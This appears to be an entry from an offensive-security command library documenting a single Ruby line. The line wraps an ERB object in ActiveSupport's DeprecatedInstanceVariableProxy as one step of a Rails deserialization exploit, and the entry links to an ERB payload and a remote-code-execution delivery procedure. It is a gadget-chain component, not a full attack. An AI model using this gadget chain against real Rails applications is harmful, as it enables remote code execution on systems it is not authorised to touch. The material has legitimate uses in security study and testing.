---
data: >-
  depr =
  ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb,:result,"@result",
  ActiveSupport::Deprecation.new)
tags:
  - rails
  - deserialization
type: command
executor: ruby
platforms:
  - Linux
id: 878e6a0c-692f-4e96-a6a5-ae7176e5c1f1
created_at: '2025-12-11T06:10:40.415Z'
updated_at: '2025-12-11T06:10:40.415Z'
verified: false
validated: true
submitted: true
---
# rails-deprecated-proxy

## Command

```ruby
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb,:result,"@result", ActiveSupport::Deprecation.new)
```

## Description

Creates a deprecated instance variable proxy to wrap the ERB object for the deserialization exploit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `erb` | ERB object | Yes |
| `:result` | Method to proxy | Yes |
| `@result` | Instance variable | Yes |
| `ActiveSupport::Deprecation.new` | Deprecator | Yes |

## Examples

### Basic Usage

```ruby
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb,:result,"@result", ActiveSupport::Deprecation.new)
```

## Expected Output

A proxy object.

## Related

- [[commands/rails-erb-payload]]
- [[procedures/Generate-and-Deliver-Deserialization-Payload-for-RCE]]
